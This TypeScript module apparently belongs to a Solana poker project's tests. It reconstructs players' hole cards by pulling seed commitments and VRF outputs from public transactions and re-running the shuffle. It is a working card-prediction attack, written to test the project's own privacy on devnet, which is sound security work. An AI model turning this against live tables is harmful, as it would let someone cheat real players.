// What an observer can rebuild of a hand from the transaction data a TEE RPC login returns: each
// seat's seed from commit_seed transactions and the VRF output from the oracle's fulfillment. Used
// by tests/hand.devnet.ts and scripts/attack-deck-from-public-txs.ts.
import { PublicKey } from "@solana/web3.js";
import { createHash } from "crypto";
import bs58 from "bs58";
import { entropyOf, shuffleSeed, shuffle, holeCards, dealOrder, firstButton, nextButton, SEATS, cardName } from "./verifier";

const VRF = "Vrf1RNUjXmQGjmQrQLvJHs9SNkvDJEsRVFPkfSQUwGz";
const disc = (n: string) => createHash("sha256").update(`global:${n}`).digest().subarray(0, 8);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/**
 * Tries, for up to `waitMs`, to rebuild hand `handNo` (dealt to `dealtMask`) at `table` through `url`.
 * For a hand after the first, pass the previous button. Returns predicted hole cards when it can.
 */
export async function recoverHand(url: string, table: PublicKey, handNo: bigint, dealtMask: number, waitMs: number, prevButton?: number) {
  const rpc = async (method: string, params: any[]) => (await (await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) })).json()) as any;
  let seeds: Buffer[] = [], seedMask = 0, vrfOutput: Buffer | null = null, sigs: any[] = [], hidden = 0;
  const start = Date.now();
  do {
    sigs = (await rpc("getSignaturesForAddress", [table.toBase58(), { limit: 200 }])).result ?? [];
    hidden = 0;
    // Successful commit_seed calls and VRF fulfillments, with their slots.
    const commits: { slot: number; seat: number; seed: Buffer }[] = [], fulfillments: { slot: number; output: Buffer }[] = [];
    for (const s of sigs) {
      const tx = (await rpc("getTransaction", [s.signature, { encoding: "json", maxSupportedTransactionVersion: 0 }])).result;
      const msg = tx?.transaction?.message;
      if (!msg || !(msg.accountKeys ?? []).length) { hidden++; continue; }
      if (tx.meta?.err) continue;
      for (const ix of msg.instructions ?? []) {
        const data = Buffer.from(bs58.decode(ix.data));
        if (data.subarray(0, 8).equals(disc("commit_seed"))) commits.push({ slot: tx.slot, seat: data[8], seed: data.subarray(9, 41) });
        // VRF ProvideRandomness: 8-byte tag, input (32), output (32), proof (96).
        if (msg.accountKeys[ix.programIdIndex] === VRF && data[0] === 4 && data.length === 168) fulfillments.push({ slot: tx.slot, output: data.subarray(40, 72) });
      }
    }
    // Hand k is dealt by the k-th fulfillment (no retries or aborts in these runs); each seat's seed
    // is its latest successful commit before that.
    fulfillments.sort((a, b) => a.slot - b.slot);
    const f = fulfillments[Number(handNo) - 1];
    seeds = Array.from({ length: SEATS }, () => Buffer.alloc(32)); seedMask = 0;
    vrfOutput = f?.output ?? null;
    if (f) {
      for (const c of commits.filter((c) => c.slot < f.slot).sort((a, b) => a.slot - b.slot)) { seeds[c.seat] = c.seed; seedMask |= 1 << c.seat; }
    }
    if (vrfOutput && (seedMask & dealtMask) === dealtMask) break;
    await sleep(1000);
  } while (Date.now() - start < waitMs);
  const r: any = { signaturesListed: sigs.length, transactionsHidden: hidden, seedsFound: seedMask, vrfOutputFound: !!vrfOutput };
  if (vrfOutput) {
    const s = shuffleSeed(table, handNo, entropyOf(createHash("sha256").update(vrfOutput).digest()), seedMask & dealtMask, seeds.map((x, i) => (dealtMask & (1 << i) ? x : Buffer.alloc(32))));
    const button = handNo === 1n ? firstButton(s, dealtMask) : nextButton(prevButton ?? 0, dealtMask);
    r.predicted = holeCards(shuffle(s), dealOrder(button, dealtMask)).map((h) => h.map(cardName));
  }
  return r;
}
